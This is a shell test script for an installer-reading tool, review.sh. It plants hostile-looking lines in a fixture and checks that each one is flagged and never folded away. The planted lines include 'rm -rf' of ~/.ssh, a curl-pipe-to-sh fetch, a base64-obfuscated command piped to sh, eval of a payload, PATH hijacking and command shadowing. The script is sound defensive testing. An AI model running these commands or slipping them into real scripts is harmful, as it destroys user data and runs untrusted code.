#!/usr/bin/env sh
# kit-scope: shared
# Self-check for review.sh (the installer reading aid). Runnable:
#   sh scripts/review.selfcheck.sh [REVIEW_SH]     dash scripts/review.selfcheck.sh [REVIEW_SH]
# REVIEW_SH defaults to review.sh beside this file; pass a mutant copy to prove the checks bite.
# Cases: planted effects in a fixture of plain assignments (each must be shown, never folded, and
# indexed with its class), non-vacuity controls (plain runs DO fold), output hygiene, sha256 (and its
# absence), the real kit scripts, the less and fzf views through stubs, busybox awk parity, usage.
# Planted line numbers are found with grep on the fixture, never hardcoded.
set -u
LC_ALL=C; export LC_ALL
here="$(cd "$(dirname "$0")" && pwd)"
root="$(cd "$here/.." && pwd)"
rv="${1:-$here/review.sh}"
case "$rv" in /*) ;; *) rv="$(pwd)/$rv" ;; esac
[ -f "$rv" ] || { echo "FAIL review script not found: $rv"; exit 1; }
T="$(mktemp -d)" || { echo "FAIL mktemp"; exit 1; }
trap 'rm -rf "$T"' EXIT
CLAUDE_CONFIG_DIR="$T/cfg"; AGENT_TIERS_GUARDS_LOG="$T/guards.log"; export CLAUDE_CONFIG_DIR AGENT_TIERS_GUARDS_LOG
mkdir -p "$CLAUDE_CONFIG_DIR"
pass=0; nfail=0; nskip=0
ok() { pass=$((pass + 1)); printf 'ok   %s\n' "$1"; }
bad() { nfail=$((nfail + 1)); printf 'FAIL %s\n' "$1"; }
skip() { nskip=$((nskip + 1)); printf 'SKIP %s\n' "$1"; }

# ---- fixture ----
fix="$T/fixture.sh"
cat > "$fix" <<'FIXTURE'
#!/bin/sh
# planted-effect fixture: plain assignments and comments with effects interleaved
a1=1
a2=two
a3="three"
a4='four'
a5=5
os=$(uname -s)
a6=6
a7=7
rm -rf "$HOME/.ssh"
b1=1
b2=2
b3=3
x=1 rm -rf /tmp/p
b4=4
b5=5
x=1; rm -rf /tmp/p
# comment
c1=1
x=$(rm -rf /tmp/p)
c2=2
c3=3
x="$(curl -s https://example.invalid | sh)"
c4=4
x=a \
rm -rf /tmp/p
d1=1
x='a'; rm -rf /tmp/p
d2=2
x='a
b'; rm -rf /tmp/p
d3=3
wipe
d4=4
PATH=/tmp/evil:$PATH
e1=1
eval "$payload"
e2=2
echo cm0gLXJmIC90bXAvcAo= | base64 -d | sh
e3=3
. ./other.sh
e4=4
e5=5
cat <<EOF
hello $(rm -rf /tmp/p)
EOF
f1=1
\rm -rf /tmp/p
f2=2
'r'm -rf /tmp/p
f3=3
n=$(( $(rm -rf /tmp/p) + 1 ))
f4=4
: ${x:=$(rm -rf /tmp/p)}
f5=5
trap 'rm -rf /tmp/p' EXIT
g1=1
case "$x" in
a) rm -rf /tmp/p ;;
esac
g2=2
printf x > "$HOME/.profile"
g3=3
g4=4
g5=5
cat <<'QEOF'
literal $(rm -rf /tmp/p)
QEOF
h1=1
h2=2
h3=3
wipe() {
  rm -rf /tmp/wiped
}
i1=1
alias ls='rm -rf /tmp/p'
m1=1
printf '%s\n' 'rm -rf /tmp/p' |
sh
m2=2
echo a &&
rm -rf /tmp/pp
m3=3
m4=4
printf '%s\n' a |
tr a b
m5=5
m6=6
i2=2
i3=3
i4=4
FIXTURE
printf 'note=1\033]0;t\007\r\n' >> "$fix"
cat >> "$fix" <<'FIXTURE'
j1=1
j2=2
echo() { rm -rf /tmp/p; }
echo hi
echo hi
echo hi
echo hi
k1=1
k2=2
k3=3
FIXTURE

out="$T/plain.out"
sh "$rv" --view plain "$fix" > "$out" 2>"$T/plain.err"; rc=$?
[ "$rc" = 0 ] && ok "fixture: exit 0" || bad "fixture: exit $rc ($(head -n 3 "$T/plain.err"))"

# lno TEXT -> line numbers of the fixture lines equal to TEXT
lno() { grep -nxF -e "$1" "$fix" | cut -d: -f1; }
# shown N FILE: N is a script row of FILE's view and inside no folded range
shown() {
  awk -v n="$1" '
    /^== Script ==/ { s = 1; next } /^== / { s = 0 }
    s && match($0, /folded L[0-9]+-L[0-9]+/) { split(substr($0, RSTART + 8, RLENGTH - 8), a, "-L"); if (n >= a[1] + 0 && n <= a[2] + 0) f = 1; next }
    s && $1 == n { r = 1 }
    END { exit !(r && !f) }' "${2:-$out}"
}
folded() {
  awk -v n="$1" '
    /^== Script ==/ { s = 1; next } /^== / { s = 0 }
    s && match($0, /folded L[0-9]+-L[0-9]+/) { split(substr($0, RSTART + 8, RLENGTH - 8), a, "-L"); if (n >= a[1] + 0 && n <= a[2] + 0) f = 1 }
    END { exit !f }' "${2:-$out}"
}
# rowtag N: the tag column of script row N
rowtag() { awk -v n="$1" '/^== Script ==/ { s = 1; next } /^== / { s = 0 } s && $1 == n { print substr($0, 7, 1); exit }' "${2:-$out}"; }
# indexed N CLASS [REASON-PREFIX] FILE
indexed() {
  awk -v n="L$1" -v c="$2" -v why="${3:-}" '
    /^== Effects index ==/ { s = 1; next } /^== / { s = 0 }
    s && index($0, n "  " c "  ") == 1 && (why == "" || index($0, n "  " c "  " why) == 1) { f = 1 }
    END { exit !f }' "${4:-$out}"
}
# plant TEXT CLASS [REASON-PREFIX]: every fixture line equal to TEXT is shown; CLASS (EFFECT|ESCAPE|-) indexed
plant() {
  ls_=$(lno "$1"); [ -n "$ls_" ] || { bad "planted line missing from fixture: $1"; return; }
  for n_ in $ls_; do
    if ! shown "$n_"; then bad "planted L$n_ folded or missing: $1"; continue; fi
    if [ "$2" != - ] && ! indexed "$n_" "$2" "${3:-}"; then bad "planted L$n_ not indexed as $2${3:+ ($3)}: $1"; continue; fi
    c_=${2#-}; ok "planted L$n_ shown${c_:+ as $c_}: $1"
  done
}

plant 'rm -rf "$HOME/.ssh"' EFFECT 'effect command rm'
plant 'x=1 rm -rf /tmp/p' EFFECT 'effect command rm'
plant 'x=1; rm -rf /tmp/p' EFFECT 'effect command rm'
plant 'x=$(rm -rf /tmp/p)' EFFECT 'effect command rm'
plant 'x="$(curl -s https://example.invalid | sh)"' ESCAPE 'runs other code'
plant 'x="$(curl -s https://example.invalid | sh)"' EFFECT 'effect command curl'
plant 'x=a \' -
n=$(lno 'x=a \'); n=$((n + 1))
if shown "$n" && indexed "$n" EFFECT 'effect command rm'; then ok "continuation: second line L$n shown and indexed"; else bad "continuation: second line L$n not shown/indexed"; fi
plant "x='a'; rm -rf /tmp/p" EFFECT 'effect command rm'
plant "x='a" -
plant "b'; rm -rf /tmp/p" EFFECT 'effect command rm'
plant 'PATH=/tmp/evil:$PATH' ESCAPE 'changes how later commands resolve'
plant 'eval "$payload"' ESCAPE 'eval'
plant 'echo cm0gLXJmIC90bXAvcAo= | base64 -d | sh' ESCAPE 'decodes hidden data'
plant 'echo cm0gLXJmIC90bXAvcAo= | base64 -d | sh' ESCAPE 'runs other code'
plant '. ./other.sh' ESCAPE 'sources another file'
plant 'cat <<EOF' -
plant 'hello $(rm -rf /tmp/p)' EFFECT 'effect command rm'
plant '\rm -rf /tmp/p' ESCAPE 'command from a variable or quoted word'
plant "'r'm -rf /tmp/p" ESCAPE 'command from a variable or quoted word'
plant 'n=$(( $(rm -rf /tmp/p) + 1 ))' EFFECT 'effect command rm'
plant ': ${x:=$(rm -rf /tmp/p)}' EFFECT 'effect command rm'
plant "trap 'rm -rf /tmp/p' EXIT" ESCAPE 'deferred code in a string'
plant 'a) rm -rf /tmp/p ;;' EFFECT 'effect command rm'
plant 'printf x > "$HOME/.profile"' EFFECT 'writes a file'
plant 'wipe' EFFECT 'calls effect function wipe'
plant 'wipe() {' -
plant '  rm -rf /tmp/wiped' EFFECT 'effect command rm'
plant 'echo() { rm -rf /tmp/p; }' ESCAPE 'function shadows echo'
plant 'echo hi' ESCAPE 'calls escape function echo'
plant "alias ls='rm -rf /tmp/p'" ESCAPE 'redefines a command'
n=$(lno "printf '%s\\n' 'rm -rf /tmp/p' |"); m=$((n + 1))
if shown "$n" && shown "$m" && [ "$(rowtag "$n")" = '!' ] && [ "$(rowtag "$m")" = '!' ] && indexed "$m" ESCAPE 'runs other code'; then ok "pipe continuation: L$n-L$m both shown as escape"; else bad "pipe continuation: L$n-L$m not both shown as escape"; fi
n=$(lno 'echo a &&'); m=$((n + 1))
if shown "$n" && shown "$m" && indexed "$m" EFFECT 'effect command rm'; then ok "&& continuation: L$n-L$m both shown"; else bad "&& continuation: L$n-L$m not both shown"; fi
n=$(lno "printf '%s\\n' a |"); m=$((n + 1))
folded "$n" && folded "$m" && ok "control: benign pipe continuation L$n-L$m folded" || bad "control: benign pipe continuation L$n-L$m not folded"
n=$(grep -an '^note=1' "$fix" | cut -d: -f1)
if [ -n "$n" ] && shown "$n" && indexed "$n" ESCAPE 'non-ASCII or control bytes'; then ok "control-byte line L$n shown and indexed"; else bad "control-byte line L${n:-?} not shown/indexed"; fi
grep -q 'note=1\\x1b\]0;t\\x07\\x0d' "$out" && ok "control bytes rendered as \\xNN" || bad "control bytes not rendered as \\xNN"
grep -q '^wipe  L[0-9]*-L[0-9]*  EFFECT  called at L' "$out" && ok "effect functions section lists wipe with its call site" || bad "effect functions section missing wipe"

# ---- non-vacuity controls ----
n=$(lno 'a3="three"'); folded "$n" && ok "control: plain assignment run L$n folded" || bad "control: plain assignment run L$n not folded"
n=$(lno 'os=$(uname -s)'); folded "$n" && ok "control: os=\$(uname -s) L$n folded" || bad "control: os=\$(uname -s) L$n not folded"
n=$(lno 'literal $(rm -rf /tmp/p)'); folded "$n" && ok "control: quoted here-doc body L$n folded" || bad "control: quoted here-doc body L$n not folded"
n=$(lno 'h2=2'); folded "$n" && ok "control: assignments after a quoted here-doc L$n folded" || bad "control: L$n not folded"

# ---- output hygiene ----
nb=$(tr -d '\011\012\040-\176' < "$out" | wc -c | tr -d ' ')
[ "$nb" = 0 ] && ok "plain output is printable ASCII, tab and newline only" || bad "plain output holds $nb other bytes"

# ---- sha256 ----
want=""
if command -v sha256sum >/dev/null 2>&1; then want=$(sha256sum < "$fix" | awk '{ print $1 }')
elif command -v shasum >/dev/null 2>&1; then want=$(shasum -a 256 < "$fix" | awk '{ print $1 }')
elif command -v openssl >/dev/null 2>&1; then want=$(openssl dgst -sha256 < "$fix" | awk '{ print $NF }')
fi
if [ -n "$want" ]; then
  [ "$(tail -n 1 "$out")" = "$want  $fix" ] && ok "sha256 last line matches an independent hash" || bad "sha256 last line: $(tail -n 1 "$out")"
else
  skip "sha256 compare: no hasher on this host"
fi
mkdir -p "$T/nohash"
for t in awk od mktemp cat rm; do
  p=$(command -v "$t") && ln -s "$p" "$T/nohash/$t"
done
shbin=$(command -v sh)
PATH="$T/nohash" "$shbin" "$rv" --view plain "$fix" > "$T/nohash.out" 2>&1; rc=$?
if [ "$rc" = 1 ] && [ "$(tail -n 1 "$T/nohash.out")" = 'sha256: unavailable (no sha256sum, shasum or openssl)' ]; then
  ok "no hasher on PATH: exit 1, last line says unavailable"
else
  bad "no hasher on PATH: exit $rc, last line: $(tail -n 1 "$T/nohash.out")"
fi

# ---- real kit scripts ----
for f in agent-tiers install-flat.sh; do
  sh "$rv" --view plain "$root/scripts/$f" > "$T/$f.out" 2>&1; rc=$?
  [ "$rc" = 0 ] && ok "$f: exit 0" || bad "$f: exit $rc"
  fc=$(sed -n 's/^lines: .*folded: \([0-9]*\) in .*/\1/p' "$T/$f.out")
  [ "${fc:-0}" -gt 0 ] && ok "$f: folded $fc lines" || bad "$f: nothing folded"
  miss=""
  for n in $(grep -nE '^[[:space:]]*(rm|mv|cp|ln|mkdir|chmod|mktemp)[[:space:]]' "$root/scripts/$f" | cut -d: -f1); do
    shown "$n" "$T/$f.out" || miss="$miss L$n"
  done
  [ -z "$miss" ] && ok "$f: every raw rm/mv/cp/ln/mkdir/chmod/mktemp line shown" || bad "$f: folded effect lines:$miss"
done
miss=""; cnt=0
for n in $(grep -nE '(^|[;&|(]|\$\(|then|else|do)[[:space:]]*(edit_settings|remove_path|run_engine|run_reader)([[:space:]]|$)' "$root/scripts/agent-tiers" | grep -v '() *{' | cut -d: -f1); do
  cnt=$((cnt + 1))
  awk -v n="L$n" 'index($0, n "  ") == 1 && / (EFFECT|ESCAPE)  calls /{ f = 1 } END { exit !f }' "$T/agent-tiers.out" || miss="$miss L$n"
done
[ "$cnt" -gt 0 ] && [ -z "$miss" ] && ok "agent-tiers: all $cnt effect-function call sites indexed" || bad "agent-tiers: call sites not indexed:$miss (found $cnt)"

# ---- view plumbing (stubs) ----
mkdir -p "$T/stub"
cat > "$T/stub/less" <<STUB
#!/bin/sh
cat > "$T/less.got"
STUB
cat > "$T/stub/fzf" <<STUB
#!/bin/sh
o="$T"
: > "\$o/fzf.args"; prev=""
while [ \$# -gt 0 ]; do printf '%s\n' "\$1" >> "\$o/fzf.args"; [ "\$1" = --preview ] && prev=\$2; shift; done
cat > "\$o/fzf.items"
printf '%s' "\$SHELL" > "\$o/fzf.shell"
item=\$(grep '^L[0-9]*-[0-9]* E ' "\$o/fzf.items" | head -n 1)
f1=\${item%% *}
printf '%s\n' "\$f1" > "\$o/fzf.f1"
cmd="\${prev%%\{1\}*}'\$f1'\${prev#*\{1\}}"
sh -c "\$cmd" > "\$o/fzf.preview" 2>&1
STUB
chmod +x "$T/stub/less" "$T/stub/fzf"
PATH="$T/stub:$PATH" sh "$rv" --view less "$fix" > "$T/less.stdout" 2>&1; rc=$?
if [ "$rc" = 0 ] && grep -q '^== Script ==' "$T/less.got" && grep -q '^== Full text (escaped, numbered) ==' "$T/less.got" \
   && [ "$(sed -n '/^== Full text/,$p' "$T/less.got" | sed 1d | wc -l | tr -d ' ')" = "$(wc -l < "$fix" | tr -d ' ')" ]; then
  ok "--view less: pager got the folded view and every line escaped and numbered"
else
  bad "--view less: rc=$rc or pager input incomplete"
fi
[ "$(tail -n 1 "$T/less.stdout")" = "$(tail -n 1 "$out")" ] && ok "--view less: sha256 line printed after the pager" || bad "--view less: no sha256 line after the pager"
PATH="$T/stub:$PATH" sh "$rv" --view fzf "$fix" > "$T/fzf.stdout" 2>&1; rc=$?
[ "$rc" = 0 ] && ok "--view fzf: exit 0" || bad "--view fzf: exit $rc"
grep -qx -e '--no-sort' "$T/fzf.args" && grep -qx -e '--header' "$T/fzf.args" && grep -qx -e '--preview' "$T/fzf.args" \
  && ok "--view fzf: --no-sort, --header, --preview passed" || bad "--view fzf: missing fzf flags"
[ "$(cat "$T/fzf.shell" 2>/dev/null)" = /bin/sh ] && ok "--view fzf: SHELL=/bin/sh for the preview" || bad "--view fzf: SHELL not /bin/sh"
grep -q 'review_esc' "$T/fzf.args" && ! grep -q '/review\.' "$T/fzf.args" && ok "--view fzf: preview reads the temp path from \$review_esc only" || bad "--view fzf: temp path interpolated into the fzf args"
n=$(lno 'x=1 rm -rf /tmp/p')
grep -q "^L$n-$n E " "$T/fzf.items" && ok "--view fzf: items include the effect row L$n" || bad "--view fzf: effect row L$n missing from items"
f1=$(cat "$T/fzf.f1" 2>/dev/null); a=${f1#L}; a=${a%%-*}
want=$(awk -v n="$a" '/^== Script ==/ { s = 1; next } /^== / { s = 0 } s && $1 == n' "$out")
if [ -n "$a" ] && [ -n "$want" ] && [ "$(cat "$T/fzf.preview")" = "$want" ]; then
  ok "--view fzf: preview for $f1 prints that escaped, numbered line"
else
  bad "--view fzf: preview for '$f1' printed: $(head -n 2 "$T/fzf.preview" 2>/dev/null)"
fi
[ "$(tail -n 1 "$T/fzf.stdout")" = "$(tail -n 1 "$out")" ] && ok "--view fzf: sha256 line printed after fzf" || bad "--view fzf: no sha256 line after fzf"

# ---- portability: busybox awk, dash ----
if command -v busybox >/dev/null 2>&1 && busybox awk 'BEGIN { exit 0 }' >/dev/null 2>&1; then
  mkdir -p "$T/bb"
  printf '#!/bin/sh\nexec busybox awk "$@"\n' > "$T/bb/awk"; chmod +x "$T/bb/awk"
  printf '#!/bin/sh\nexec busybox od "$@"\n' > "$T/bb/od"; chmod +x "$T/bb/od"
  PATH="$T/bb:$PATH" sh "$rv" --view plain "$fix" > "$T/bb.out" 2>&1
  cmp -s "$out" "$T/bb.out" && ok "busybox awk and od: identical output" || bad "busybox awk and od: output differs"
elif [ "$(uname -s 2>/dev/null)" = Darwin ]; then
  # macOS ships no busybox and its users never run busybox awk; the Linux CI legs carry this parity case.
  ok "busybox awk and od parity: not applicable on macOS"
else
  skip "busybox awk and od parity: no busybox"
fi
# an od that does not print two-hex-digit fields must stop the view, never mis-render bytes
mkdir -p "$T/badod"
printf '#!/bin/sh\necho "0000000 6162"\n' > "$T/badod/od"; chmod +x "$T/badod/od"
PATH="$T/badod:$PATH" sh "$rv" --view plain "$fix" > "$T/badod.out" 2>&1; rc=$?
[ "$rc" = 2 ] && grep -q 'analysis failed' "$T/badod.out" && ok "od with unexpected fields: exit 2, analysis failed" || bad "od with unexpected fields: exit $rc"
if command -v dash >/dev/null 2>&1; then
  dash "$rv" --view plain "$fix" > "$T/dash.out" 2>&1
  cmp -s "$out" "$T/dash.out" && ok "dash: identical output" || bad "dash: output differs"
else
  skip "dash parity: no dash"
fi

# ---- usage ----
sh "$rv" >/dev/null 2>&1; rc=$?; [ "$rc" = 2 ] && ok "usage: no args exits 2" || bad "usage: no args exits $rc"
sh "$rv" "$T/missing" >/dev/null 2>&1; rc=$?; [ "$rc" = 2 ] && ok "usage: missing file exits 2" || bad "usage: missing file exits $rc"
sh "$rv" "$T" >/dev/null 2>&1; rc=$?; [ "$rc" = 2 ] && ok "usage: directory exits 2" || bad "usage: directory exits $rc"

printf '%s passed, %s failed, %s skipped\n' "$pass" "$nfail" "$nskip"
[ "$nfail" = 0 ]
